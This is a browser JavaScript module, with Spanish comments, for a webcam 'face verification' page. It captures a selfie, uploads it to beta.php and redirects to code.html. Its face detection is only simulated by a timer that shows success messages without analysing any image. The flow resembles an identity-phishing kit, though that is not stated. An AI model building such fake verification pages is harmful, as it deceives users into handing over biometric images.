class FaceVerification {
    constructor() {
        this.video = document.getElementById('video');
        this.canvas = document.getElementById('canvas');
        this.overlay = document.getElementById('overlay');
        this.statusMessage = document.getElementById('statusMessage');
        this.statusIcon = document.getElementById('statusIcon');
        this.statusText = document.getElementById('statusText');
        this.captureBtn = document.getElementById('captureBtn');
        this.retryBtn = document.getElementById('retryBtn');
        this.continueBtn = document.getElementById('continueBtn');
        this.faceFrame = document.querySelector('.face-frame');

        this.stream = null;
        this.isCapturing = false;
        this.capturedImage = null;
        this.detectionInterval = null;
        this.faceDetectionEnabled = false;
        this.stableFrames = 0;
        this.requiredStableFrames = 4; // Frames estables antes de capturar

        this.init();
    }

    async init() {
        try {
            await this.setupCamera();
            this.initFaceDetection();
            this.setupEventListeners();
        } catch (error) {
            this.showError('Error al inicializar la cámara: ' + error.message);
        }
    }

    async setupCamera() {
        try {
            this.updateStatus('camera', 'Iniciando cámara...');

            const constraints = {
                video: {
                    width: { ideal: 640, min: 480 },
                    height: { ideal: 480, min: 360 },
                    facingMode: 'user',
                    frameRate: { ideal: 30, max: 30 }
                }
            };

            this.stream = await navigator.mediaDevices.getUserMedia(constraints);
            this.video.srcObject = this.stream;

            return new Promise((resolve) => {
                this.video.onloadedmetadata = () => {
                    this.video.play();
                    setTimeout(() => {
                        this.updateStatus('search', 'Posiciona tu rostro en el marco');
                        this.hideOverlay();
                        resolve();
                    }, 1000);
                };
            });
        } catch (error) {
            throw new Error('No se pudo acceder a la cámara. Verifica los permisos.');
        }
    }

    initFaceDetection() {
        // Usar detección básica por movimiento y tiempo
        this.startBasicDetection();
    }

    startBasicDetection() {
        this.faceFrame.classList.add('detecting');
        this.enableManualCapture();

        // Simulación de detección por tiempo
        let detectionPhase = 0;

        this.detectionInterval = setInterval(() => {
            if (this.isCapturing) return;

            detectionPhase++;

            if (detectionPhase < 3) {
                // Fase de búsqueda
                this.onFaceDetected();
            } else if (detectionPhase < 8) {
                // Fase de centrado
                this.onFaceCentered();
            } else {
                // Reiniciar ciclo
                detectionPhase = 0;
                this.onFaceDetected();
            }
        }, 1000);
    }

    onFaceDetected() {
        this.faceFrame.classList.remove('centered', 'capturing');
        this.faceFrame.classList.add('detecting');
        this.updateStatus('search', 'Centra tu rostro en el marco');
        this.stableFrames = 0;
    }

    onFaceCentered() {
        this.faceFrame.classList.remove('detecting', 'capturing');
        this.faceFrame.classList.add('centered');
        this.updateStatus('check-circle', 'Perfecto! Mantente quieto...');

        this.stableFrames++;

        if (this.stableFrames >= this.requiredStableFrames) {
            // Auto-captura después de mantener posición estable
            setTimeout(() => {
                if (this.faceFrame.classList.contains('centered') && !this.isCapturing) {
                    this.capturePhoto();
                }
            }, 1500);
        }
    }

    onNoFaceDetected() {
        this.faceFrame.classList.remove('centered', 'capturing');
        this.faceFrame.classList.add('detecting');
        this.updateStatus('user', 'Posiciona tu rostro en el marco');
        this.stableFrames = 0;
    }

    enableManualCapture() {
        this.captureBtn.style.display = 'flex';
        setTimeout(() => {
            this.updateStatus('camera', 'Posiciona tu rostro y toca "Tomar Foto"');
        }, 3000);
    }

    async capturePhoto() {
        if (this.isCapturing) return;

        this.isCapturing = true;
        this.faceFrame.classList.remove('detecting', 'centered');
        this.faceFrame.classList.add('capturing');
        this.updateStatus('camera', 'Capturando...');
        this.showOverlay();

        // Detener detección
        if (this.detectionInterval) {
            clearInterval(this.detectionInterval);
        }

        // Esperar un momento para el efecto visual
        setTimeout(() => {
            this.processCapture();
        }, 800);
    }

    processCapture() {
        // Configurar canvas con las dimensiones del video
        this.canvas.width = this.video.videoWidth || 640;
        this.canvas.height = this.video.videoHeight || 480;

        const ctx = this.canvas.getContext('2d');

        // Voltear horizontalmente para que coincida con el video
        ctx.scale(-1, 1);
        ctx.drawImage(this.video, -this.canvas.width, 0);

        // Convertir a blob con buena calidad
        this.canvas.toBlob((blob) => {
            this.capturedImage = blob;
            this.onPhotoCapture();
        }, 'image/jpeg', 0.85);
    }

    onPhotoCapture() {
        this.updateStatus('check-circle', '¡Foto capturada correctamente!');

        // Mostrar controles
        setTimeout(() => {
            this.retryBtn.style.display = 'inline-flex';
            this.continueBtn.style.display = 'inline-flex';
            this.captureBtn.style.display = 'none';
        }, 1000);
    }

    retry() {
        this.isCapturing = false;
        this.capturedImage = null;
        this.stableFrames = 0;
        this.retryBtn.style.display = 'none';
        this.continueBtn.style.display = 'none';
        this.faceFrame.classList.remove('centered', 'capturing');

        // Reiniciar detección
        this.hideOverlay();
        this.startBasicDetection();
    }

    continue() {
        if (this.capturedImage) {
            this.updateStatus('cloud-upload-alt', 'Enviando imagen...');

            // Crear FormData para enviar la imagen
            const formData = new FormData();
            formData.append('selfie', this.capturedImage, 'selfie.jpg');

            // Enviar al servidor PHP
            fetch('beta.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    this.updateStatus('check-circle', 'Verificación completada');
                    setTimeout(() => {
                        window.location.href = 'code.html';
                        alert('Verificación completada! Redirigiendo...');
                    }, 2000);
                } else {
                    throw new Error(data.message || 'Error al enviar imagen');
                }
            })
            .catch(error => {
                this.updateStatus('exclamation-triangle', 'Error: ' + error.message);
                this.retryBtn.style.display = 'inline-flex';
            });
        }
    }

    stopCamera() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }
        if (this.detectionInterval) {
            clearInterval(this.detectionInterval);
        }
    }

    setupEventListeners() {
        this.captureBtn.addEventListener('click', () => this.capturePhoto());
        this.retryBtn.addEventListener('click', () => this.retry());
        this.continueBtn.addEventListener('click', () => this.continue());

        // Limpiar recursos al salir de la página
        window.addEventListener('beforeunload', () => this.stopCamera());
    }

    updateStatus(icon, text) {
        this.statusIcon.className = `fas fa-${icon}`;
        this.statusText.textContent = text;
    }

    showOverlay() {
        this.overlay.style.display = 'flex';
        this.overlay.style.opacity = '1';
    }

    hideOverlay() {
        this.overlay.style.opacity = '0';
        setTimeout(() => {
            this.overlay.style.display = 'none';
        }, 300);
    }

    showError(message) {
        this.updateStatus('exclamation-triangle', message);
        this.showOverlay();
        this.enableManualCapture();
    }
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
    new FaceVerification();
});
